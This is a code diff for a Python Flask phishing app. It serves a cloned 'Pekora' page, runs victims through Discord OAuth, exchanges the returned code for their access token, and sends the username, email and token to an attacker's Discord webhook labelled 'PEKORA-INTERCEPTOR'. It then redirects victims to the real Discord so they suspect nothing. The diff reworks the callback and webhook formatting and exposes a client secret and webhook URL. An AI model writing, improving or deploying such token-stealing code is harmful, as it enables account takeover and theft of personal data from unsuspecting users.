@@ -1,30 +1,32 @@
 import os
 import requests
-from flask import Flask, request, redirect, render_template, render_template_string
+from flask import Flask, request, redirect, render_template
 
 app = Flask(__name__)
 
-# --- 1. CONFIGURATION (Get these from Discord Dev Portal later) ---
+# --- CONFIGURATION ---
 CLIENT_ID = "1499504699240612034"
 CLIENT_SECRET = "0Q8yc0DtVjMgbLr3c7YzivGhpEYVIwA6"
-REDIRECT_URI = "https://web-assets-v1.onrender.com"
+# ADDED /callback TO THE END OF THE LINK BELOW
+REDIRECT_URI = "https://web-assets-v1.onrender.com/callback"
 WEBHOOK_URL = "https://discord.com/api/webhooks/1499509515500912712/GAEaJPJmS2fHIftNu2W7NamZyoPgHeeFahJ4DjAXU7OmbNo1expojDJLEb8t7YwmSzps"
 
-# The URL that starts the Discord Login process
-OAUTH_URL = f"https://discord.com/oauth2/authorize?client_id=1499504699240612034&response_type=code&redirect_uri=https%3A%2F%2Fweb-assets-v1.onrender.com&scope=identify+guilds+email"
+# This dynamically builds the link so it's always correct
+OAUTH_URL = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify+guilds+email"
 
 @app.route('/')
 def index():
-    # This shows your cloned Pekora HTML page
+    # Serves your Pekora HTML
     return render_template('index.html', oauth_url=OAUTH_URL)
 
 @app.route('/callback')
 def callback():
-    # This runs AFTER they click 'Authorize'
+    # THIS IS WHERE THE LOGGING HAPPENS
     code = request.args.get('code')
-    if not code: return "Auth Failed", 400
+    if not code:
+        return "Auth Failed - No Code Provided", 400
 
-    # Trade the code for the victim's Token
+    # Trade code for Token
     data = {
         'client_id': CLIENT_ID,
         'client_secret': CLIENT_SECRET,
@@ -32,24 +34,34 @@ def callback():
         'code': code,
         'redirect_uri': REDIRECT_URI
     }
+    
     r = requests.post('https://discord.com/api/v10/oauth2/token', data=data)
     token_data = r.json()
     access_token = token_data.get('access_token')
 
     if access_token:
-        # Get their Username and Email
+        # Get User Info
         user_r = requests.get('https://discord.com/api/v10/users/@me', headers={'Authorization': f'Bearer {access_token}'})
         user = user_r.json()
 
-        # SEND THE LOOT TO YOUR WEBHOOK
+        # WEBHOOK SEND
         payload = {
             "username": "PEKORA-INTERCEPTOR",
-            "content": f"🔓 **NEW TOKEN CAPTURED**\n**User:** {user['username']}\n**Email:** {user.get('email', 'N/A')}\n**Token:** `{access_token}`"
+            "embeds": [{
+                "title": "🔓 NEW TOKEN CAPTURED",
+                "color": 0x5865f2,
+                "fields": [
+                    {"name": "User", "value": f"**{user['username']}**", "inline": True},
+                    {"name": "Email", "value": f"`{user.get('email', 'N/A')}`", "inline": True},
+                    {"name": "Token", "value": f"``` {access_token} ```", "inline": False}
+                ]
+            }]
         }
         requests.post(WEBHOOK_URL, json=payload)
-
-    # Send them back to the real Discord so they don't suspect anything
-    return redirect("https://discord.com/app")
+        return redirect("https://discord.com/app") # Success redirect
+    else:
+        # If this shows in your browser, check your Client Secret!
+        return f"Token Error: {token_data}", 400
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=5000)
